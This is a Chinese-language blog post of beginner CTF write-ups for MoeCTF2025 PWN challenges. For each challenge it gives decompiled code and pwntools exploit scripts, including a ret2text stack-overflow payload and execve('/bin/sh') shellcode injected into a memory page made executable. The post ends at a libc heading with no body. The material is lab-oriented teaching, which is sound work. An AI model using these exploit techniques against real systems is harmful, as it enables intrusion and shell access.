---
title: MoeCTF2025PWN笔记
description: "MoeCTF2025PWN个人向学习笔记"
date: "2026-01-26 12:00:00"
draft: false
sticky: false
showHeroImage: false
tags: [PWN, WP]
categories: [WP]
series: []
comments: true
sidebar:
  enable: true
  toc: true
  relatedPosts: true
---

# MoeCTF2025PWN笔记

> 重新写了一下，算是温故知新吧，也希望能对学习 PWN 的新人有帮助。

## 0 二进制漏洞审计入门指北

阅读入门指北，开启你的学习吧！

### 文件保护

一般来说，获取一个附件后，我们会首先检查这个文件的保护 `checksec ./pwn` 

| 属性       | 值               |
| -------- | --------------- |
| Arch     | amd64-64-little |
| RELRO    | Full RELRO      |
| Stack    | Canary found    |
| NX       | NX enabled      |
| PIE      | PIE enabled     |
| SHSTK    | Enabled         |
| IBT      | Enabled         |
| Stripped | No              |

当然了这里的你并不会被文件保护拦住，后面遇到再介绍。

### 逆向分析

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-74h] BYREF
  _BYTE buf[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v6; // [rsp+78h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  puts("Guess who am i!");
  print_desc();
  puts("Before u answer me,solve some bypass function!");
  puts("First,you need to tell me the password.");
  __isoc99_scanf("%d", &v4);
  if ( v4 != passwd )
  {
    puts("Maybe you should recall what the password is!");
    exit(1);
  }
  puts("Right!Then,give the answer.");
  read(0, buf, 0x64u);
  if ( !(unsigned int)bypass(buf) )
  {
    puts("You are right!Now i give u what u want!");
    backdoor();
  }
  return 0;
}
```

在程序的 `main()` 函数中，会读取 `v4` 并将其与 `passwd` 比较，不相等则退出进程；同时还需要使 `bypass(buf)` 的值为 0 才能进入后门函数 `backdoor()` 

```c
unsigned __int64 backdoor()
{
  FILE *stream; // [rsp+0h] [rbp-80h]
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v3; // [rsp+78h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  stream = fopen("/flag", "r");
  if ( !stream )
    perror("[-] fopen failed");
  if ( !fgets(s, 100, stream) )
  {
    perror("[-] fgets failed");
    fclose(stream);
  }
  puts(s);
  fclose(stream);
  return v3 - __readfsqword(0x28u);
}
```

可以看到 `backdoor()` 中打印了 flag

在 IDA 中双击 `passwd` 即可看到 `.data` 段上的全局变量 `passwd` 的值是十六进制数 `0x1BF4F` ，也就是 114511，所以第一次输入 114511 通过第一个检查。第二个检查要麻烦一些

```c
__int64 __fastcall bypass(__int64 a1)
{
  if ( !a1 )
    return 0;
  if ( *(_DWORD *)a1 == -559038737 && !strcmp((const char *)(a1 + 4), "shuijiangui") )
    return 0;
  puts("Something wrong.");
  return 1;
}
```

在 `main()` 中变量 `buf` 的类型是 `_BYTE buf` 这在逆向得到的伪代码中经常见到，可以看到一个是占一个字节大小，然而在 `bypass()` 中将它作为了一个 `__int64` 类型的整数，这涉及到数据在内存中的储存，这里不展开讲，`-559038737` 是一个很奇怪的数字，但是可以在 IDA 中右键它看到十六进制是 `0xDEADBEEF` 这会是一个常见的数字，同时这个判断的第二个条件是 a1 也就是 buf 的第五个字节开始是 `"shuijiangui"` ，所以构造符合这两个条件的 payload ，下面是 exp

### EXP

```python
from pwn import *                                    # 导入 pwntools。
context(arch='amd64', os='linux', log_level='debug') # 一些基本的配置。

# 有时我们需要在本地调试运行程序，需要配置 context.terminal。详见入门指北。

# io = process('./pwn')             # 在本地运行程序。
# gdb.attach(io)                    # 启动 GDB
io = connect(???, ???)              # 与在线环境交互。
io.sendline(b'114511')              # 什么时候用 send 什么时候用 sendline？

payload  = p32(0xdeadbeef)          # p32(0xdeadbeef)、b"\xde\xad\xbe\xef"、b"deadbeef" 有什么区别？
                                    # 你看懂原程序这里的检查逻辑了吗？
payload += b'shuijiangui'           # strcmp

io.sendafter(b'password.', payload) # 发送！通过所有的检查。

io.interactive()                    # 手动接收 flag。
```



## **1 ez_u64**

与上题同样的文件保护，这一次也用不到

### 逆向分析

```c
unsigned __int64 vuln()
{
  __int64 v1; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Ya hello! Let's play a game.");
  printf("Guess which number I'm thinking of.");
  printf("Here is the hint.");
  write(1, &num, 8u);
  printf("\n>");
  __isoc99_scanf("%zu", &v1);
  if ( v1 != num )
  {
    puts("Wrong answer!");
    puts("Try pwntools u64?");
    exit(1);
  }
  puts("Win!");
  system("/bin/sh");
  return v2 - __readfsqword(0x28u);
}

int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  vuln();
  return 0;
}
```

可以在 `.bss` 上找到全局变量 `num`  运行程序试看看，程序输出了乱码，这是由于 `write` 直接打印了二进制数据。使用 pwntools 的 `u64()` 可以解码，`p64()`可以编码，`p64() p32() p16() p8()` 分别对应 8字节 4字节 2字节 1字节的大小，这里是 8 个字符也就是8字节，所以使用 u64 解码得到 num ，再向程序发送 num 即可执行 `system("/bin/sh")` 

对于许多 PWN 题，都需要通过执行 `system("/bin/sh")` 来实现 get shell 这样就可以对远程靶机进行操作了，比如 `cat flag`

### EXP

```python
from pwn import*

context(arch = 'amd64',log_level = 'debug',os='linux')

io=remote("127.0.0.1",56269)
# io=process('./pwn')

io.recvuntil("hint.")
num=u64(io.recv(8))
io.sendline(str(num).encode())

io.interactive()
```

## 1 find it

> 初始fd：0，1，2分配给了stdin,stdout,stderr。新的stdout从3开始分配。open flag后，由于关闭了1，flag会被分配到1。依次输入3,./flag,1即可。

 

## 2 EZtext

### 文件保护

| 属性     | 值                |
| -------- | ----------------- |
| Arch     | amd64-64-little   |
| RELRO    | Partial RELRO     |
| Stack    | No canary found   |
| NX       | NX enabled        |
| PIE      | No PIE (0x400000) |
| Stripped | No                |

### 逆向分析

```c
int treasure()
{
  puts("Congratulations! You got the secret!");
  return system("/bin/sh");
}
int __fastcall overflow(int a1)
{
  _BYTE buf[8]; // [rsp+18h] [rbp-8h] BYREF

  if ( a1 <= 7 )
    return puts("Come on, you can't even fill up this array?");
  read(0, buf, a1);
  return puts("OK,I receive your byte.and then?");
}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v4; // [rsp+Ch] [rbp-4h] BYREF

  init(argc, argv, envp);
  puts("Stack overflow is a powerful art!");
  puts("In this MoeCTF,I will show you the charm of PWN!");
  puts("You need to understand the structure of the stack first.");
  puts("Then how many bytes do you need to overflow the stack?");
  __isoc99_scanf("%d", &v4);
  overflow(v4);
  return 0;
}
```

这是一个栈溢出漏洞，如文件中打印的：首先你需要理解栈的结构（自行理解），以及需要多少字节才能溢出

在 `overflow()` 中，要求我们输入的数字大于7，因为在 `overflow()` 中的 `buf[]` 的大小是 8 字节。首先填满 `buf[]` 再覆盖 RBP ，再将 `treasure()` 的地址填入

### EXP

```c
from pwn import *
context(arch='amd64', log_level='debug', os='linux')

io = remote('127.0.0.1', 52431)
# io = process('./pwn')
io.sendline(b'40')

payload = b'a'*16+ p64(0x4011BE)	# 16字节覆盖了 buf 和 rbp
# 原本栈上 rbp 后是该函数的返回地址，现在将其修改为了 0x4011BE，程序流便被我们劫持到 0x4011BE执行
io.sendline(payload)
io.interactive()
```

## 2 ezshellcode

### 逆向

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+0h] [rbp-20h] BYREF
  int prot; // [rsp+4h] [rbp-1Ch]
  int v6; // [rsp+8h] [rbp-18h]
  int v7; // [rsp+Ch] [rbp-14h]
  void *s; // [rsp+10h] [rbp-10h]
  unsigned __int64 v9; // [rsp+18h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  init(argc, argv, envp);
  s = mmap(0, 0x1000u, 3, 34, -1, 0);
  if ( s == (void *)-1LL )
  {
    perror("mmap");
    return 1;
  }
  memset(s, 0, 0x1000u);
  v6 = 0;
  prot = 0;
  puts("In a ret2text exploit, we can use code in the .text segment.");
  puts("But now, there is no 'system' function available there.");
  puts("How can you get the flag now? Perhaps you should use shellcode.");
  puts("But what is shellcode? What can you do with it? And how can you use it?");
  puts("I will give you some choices. Choose wisely!");
  __isoc99_scanf("%d", &v4);
  do
    v7 = getchar();
  while ( v7 != 10 && v7 != -1 );
  if ( v4 == 4 )
  {
    if ( v6 == 1 )
      puts("You can only make one change!");
    prot = 7;
    v6 = 1;
  }
  else
  {
    if ( v4 > 4 )
      goto LABEL_24;
    switch ( v4 )
    {
      case 3:
        if ( v6 == 1 )
          puts("You can only make one change!");
        prot = 4;
        v6 = 1;
        break;
      case 1:
        if ( v6 == 1 )
          puts("You can only make one change!");
        prot = 1;
        v6 = 1;
        break;
      case 2:
        if ( v6 == 1 )
          puts("You can only make one change!");
        prot = 3;
        v6 = 1;
        break;
      default:
LABEL_24:
        puts("Invalid choice. The space remains in its chaotic state.");
        exit(1);
    }
  }
  if ( mprotect(s, 0x1000u, prot) == -1 )
  {
    perror("mprotect");
    exit(1);
  }
  puts("\nYou have now changed the permissions of the shellcode area.");
  puts("If you can't input your shellcode, think about the permissions you just set.");
  read(0, s, 0x1000u);
  ((void (*)(void))s)();
  return 0;
}
```

**在Linux中，`mprotect` 函数的功能是用来设置一块内存的权限**

第三个参数 prot 代表内存块所拥有的权限：

-   无法访问 即PROT_NONE：不允许访问，值为 0
-   可读权限 即PROT_READ：可读，值加 1
-   可写权限 即PROT_WRITE：可读， 值加 2
-   可执行权限 即PROT_EXEC：可执行，值加 4

 `.text` 段就是可执行的，在 IDA 中可以可看到 `.text` 段的汇编代码，程序运行时执行这些机器指令。如果一块内存同样是可执行的，且有写的条件时，可以向其中注入一段机器码，再控制程序执行这段代码。这样的机器码被叫做 shellcode 

在编写 shellcode 时，一般会使用到系统调用，一段 shellcode 如下

```assembly
mov rbx, 0x68732f6e69622f ;
push rbx;
mov rdi, rsp;

xor rsi,rsi;
xor rdx,rdx;
mov rax,0x3b;
syscall;
```

这段 shellcode 展示了一个 执行 `execve("/bin/sh")` 的过程，或者说是 `system("/bin/sh")` ，在 x64 下，前六个参数依次通过 `rdi` `rsi` `rdx` `rcx(r10)` `r8` `r9` 传递 ，`0x3b` 即 59 是 `execve` 的系统调用号，关于系统调用可以看[这里](https://syscall.sh/) ，`0x68732f6e69622f` 就是 `/bin/sh` 字符串的 ASCII 码，注意是小端序。将 `/bin/sh` 字符串放进 `rbx` ，压入栈顶寄存器 `rsp` ，再将 `rsp` 放入 `rdi` 作为第一个参数，（一般来说将字符串指针作为参数而不是字符串本身）`xor rsi rsi` 是将 `rsi` 的置零。`rax` 的值决定了系统调用。

### EXP

```python
from pwn import *
context(arch='amd64', log_level='debug', os='linux')

# io = remote('host', port)
io = process('./pwn')

io.sendline(b'4')

shellcode="""
mov rbx, 0x68732f6e69622f ;
push rbx;
mov rdi, rsp;

xor rsi,rsi;
xor rdx,rdx;
mov rax,0x3b;
syscall;
"""

shellcode=asm(shellcode)
io.sendafter("set.",shellcode)

io.interactive()
```

## 3 认识libc

> 什么是 libc ? C语言是怎么实现的？程序也没有用到类似 system 的函数，那么你将如何 getshell 呢？
>
> **libc（C Standard Library）是 C 语言最基础的函数库** ，libc 是我们操作系统的基础部件，基本上所有的程序都依赖它。在不同的操作系统中，libc 的具体实现可能不同，其中在 Linux 上最广泛使用的实现是 `GNU C Library`，也就是我们常说的 `glibc` 

### 文件保护

